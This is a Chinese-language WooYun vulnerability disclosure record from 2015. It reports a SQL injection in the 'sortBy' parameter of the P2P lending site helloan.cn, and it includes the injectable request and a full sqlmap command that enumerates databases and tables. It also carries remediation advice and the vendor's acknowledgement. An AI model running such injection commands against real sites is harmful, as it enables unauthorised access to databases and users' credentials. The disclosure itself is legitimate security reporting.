{"id": 27888, "wybug_id": "wooyun-2015-0124184", "wybug_title": "p2p金融安全之合力贷某站注入漏洞", "wybug_corp": "helloan.cn", "wybug_author": "her0ma", "wybug_date": "2015-07-07 10:48", "wybug_open_date": "2015-08-21 14:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向公众公开  简要描述： p2p金融安全系列，继续刷几个吧.... 没啥技术含量~ 详细说明：  合力贷（北京）科技有限公司是全球首家SAAS化O2O模式的网络借贷云平台，秉承着诚信、透明、专业、创新的理念，以先进的SAAS化技术服务合作伙伴，通过专业的风控手段，将网络交易的优势和传统的风险控制进行有机结合，实现借贷风险的过程化管理和控制，为合格投资人及机构与分散在全国各地由当地合作授权机构监管的小微企业等借款人提供交易信息服务。主站存在SQL注入漏洞，是POST类型的，具体的请求如下：http://www.helloan.cn/process/lend/bidsbidMold=&boorrowTimeLimit=1&boorrowTimeLimitStr=&borrowLimitMax=1&borrowLimitMin=1&borrowLimitStr=&borrowUse=&dir=&isFromPageBtnB=&pageNow=&rate=1&rateStr=&refundWay=&riskRankId=&securityMode=&sortBy=*&status=&title=Mr.&user.residence.city=San%20Francisco其中sortBy参数存在注入漏洞，可能是使用了拼接SQL语句导致的。SQlmap注入之：python sqlmap.py -u \"http://www.helloan.cn/process/lend/bids\" --data=\"bidMold=&boorrowTimeLimit=1&boorrowTimeLimitStr=&borrowLimitMax=1&borrowLimitMin=1&borrowLimitStr=&borrowUse=&dir=&isFromPageBtnB=&pageNow=&rate=1&rateStr=&refundWay=&riskRankId=&securityMode=&sortBy=*&status=&title=Mr.&user.residence.city=San%20Francisco\" --tables -D helloan -p \"sortBy\" --dbs -v 3 --level 3 --dbms \"MySQL\" --random-agent   漏洞证明：  如图：\n\n\n\n表太多就不继续渗透了，简单看了几个用户的密码，有点像wordpress的加密方式，不是md5，懒得继续研究了.   修复方案：  1,禁止使用拼接SQL语句；2,可以考虑使用占位符的方式，并对相关参数进行过滤。ps：应该还有其它的注入点，建议一起检查一下。   版权声明：转载请注明来源 her0ma@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2015-07-07 14:47 厂商回复： 高危漏洞-谢谢白帽子，我将尽快给予修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}